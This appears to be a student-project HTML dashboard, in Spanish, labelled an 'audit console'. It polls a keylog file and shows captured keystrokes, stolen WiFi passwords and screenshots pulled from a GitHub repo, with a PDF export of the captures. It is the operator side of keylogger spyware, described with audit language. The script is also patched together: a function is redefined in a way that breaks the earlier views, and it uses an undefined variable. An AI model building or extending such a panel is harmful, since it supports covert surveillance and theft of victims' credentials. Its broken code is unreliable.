<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEBULOS | Audit Console</title>
    <style>
        :root { --main-color: #00ff41; --bg-color: #0a0a0a; --accent-color: #003300; }
        body { font-family: 'Courier New', monospace; background: var(--bg-color); color: var(--main-color); margin: 0; padding: 20px; overflow-x: hidden; }
        
        .header { text-align: center; border: 2px solid var(--main-color); padding: 10px; margin-bottom: 20px; box-shadow: 0 0 15px var(--accent-color); }
        .blink { animation: blinker 1.5s linear infinite; font-weight: bold; }
        @keyframes blinker { 50% { opacity: 0; } }

        .tabs { display: flex; gap: 10px; margin-bottom: 10px; }
        .tab-btn { background: var(--bg-color); color: var(--main-color); border: 1px solid var(--main-color); padding: 10px 20px; cursor: pointer; transition: 0.3s; }
        .tab-btn:hover, .tab-btn.active { background: var(--main-color); color: #000; }

        .console-box { 
            background: rgba(0, 20, 0, 0.9); border: 1px solid var(--main-color); height: 500px; 
            overflow-y: auto; padding: 15px; position: relative; box-shadow: inset 0 0 20px #000;
        }

        .status-bar { display: flex; justify-content: space-between; font-size: 0.8em; margin-top: 10px; border-top: 1px solid var(--accent-color); padding-top: 5px; }
        pre { white-space: pre-wrap; word-wrap: break-word; margin: 0; line-height: 1.5; }
        
        /* Estilo para las contraseñas WiFi */
        .wifi-item { color: #fff; background: #003300; padding: 2px 5px; margin: 2px 0; display: block; }
    </style>
</head>
<body>

<div class="header">
    <h1>PROJECT NEBULOS <span class="blink">●</span></h1>
    <p>SISTEMA DE AUDITORÍA REMOTA - DAM FINAL PROJECT</p>
</div>

<div class="tabs">
    <button class="tab-btn active" onclick="switchView('full')">REPORTE COMPLETO</button>
    <button class="tab-btn" onclick="switchView('wifi')">REDES WIFI</button>
    <button class="tab-btn" onclick="switchView('keys')">TECLADO</button>
</div>

<div class="console-box" id="console">
    <pre id="output">Iniciando conexión con el agente remoto...</pre>
</div>

<div class="status-bar">
    <span id="update-time">Última sync: --:--:--</span>
    <span>STATUS: <span style="color: #00ff41">CONNECTED</span></span>
</div>

<script>
    let rawData = "";

    async function loadLogs() {
        const output = document.getElementById('output');
        const updateTime = document.getElementById('update-time');
        try {
            const response = await fetch('keylog.txt?t=' + new Date().getTime());
            if (!response.ok) throw new Error("Esperando reporte del agente...");
            rawData = await response.text();
            
            renderView('full'); // Por defecto mostramos todo
            updateTime.textContent = "Última sync: " + new Date().toLocaleTimeString();
        } catch (err) {
            output.textContent = ">>> [ERROR]: " + err.message;
        }
    }

    function renderView(mode) {
        const output = document.getElementById('output');
        if (!rawData) return;

        if (mode === 'full') {
            output.textContent = rawData;
        } 
        else if (mode === 'wifi') {
            const wifiSection = rawData.split('--- MODULO WIFI ---')[1]?.split('--- MODULO KEYLOGGER ---')[0];
            output.innerHTML = wifiSection ? wifiSection.trim() : "No se han encontrado datos WiFi.";
        } 
        else if (mode === 'keys') {
            const keySection = rawData.split('--- MODULO KEYLOGGER ---')[1];
            output.textContent = keySection ? keySection.trim() : "Esperando pulsaciones...";
        }
        
        // Auto-scroll
        const consoleBox = document.getElementById('console');
        consoleBox.scrollTop = consoleBox.scrollHeight;
    }

    function switchView(mode) {
        // Estética de botones
        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
        event.target.classList.add('active');
        renderView(mode);
    }

    // Intervalo de actualización (cada 30 segundos para el dashboard)
    setInterval(loadLogs, 30000);
    loadLogs();
</script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>

<button class="tab-btn" style="border-color: #ff0000; color: #ff0000;" onclick="generarPDF()">GENERAR REPORTE PDF</button>

<script>
    async function generarPDF() {
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();
        
        doc.setFont("courier");
        doc.setFontSize(18);
        doc.text("REPORT DE AUDITORÍA - PROJECT NEBULOS", 10, 20);
        doc.setFontSize(12);
        doc.text("Fecha: " + new Date().toLocaleString(), 10, 30);
        doc.text("------------------------------------------", 10, 35);
        
        // Dividir el texto largo para que quepa en el PDF
        const splitText = doc.splitTextToSize(rawData, 180);
        doc.text(splitText, 10, 45);
        
        doc.save("Auditoria_Nebulos_DAM.pdf");
    }
    // ... (mantén el resto de tus funciones loadLogs y switchView)
</script>
    <button class="tab-btn" onclick="switchView('screen')">MONITOR VISUAL</button>

<script>
    function renderView(mode) {
        const output = document.getElementById('output');
        if (mode === 'screen') {
            // Aquí cargamos la imagen directamente desde el repo de GitHub
            output.innerHTML = `<img src="https://raw.githubusercontent.com/${REPO}/main/sys_temp_img.png?t=${new Date().getTime()}" style="width:100%; border:1px solid var(--main-color);">`;
        }
        // ... resto del código
    }
</script>

</body>
</html>
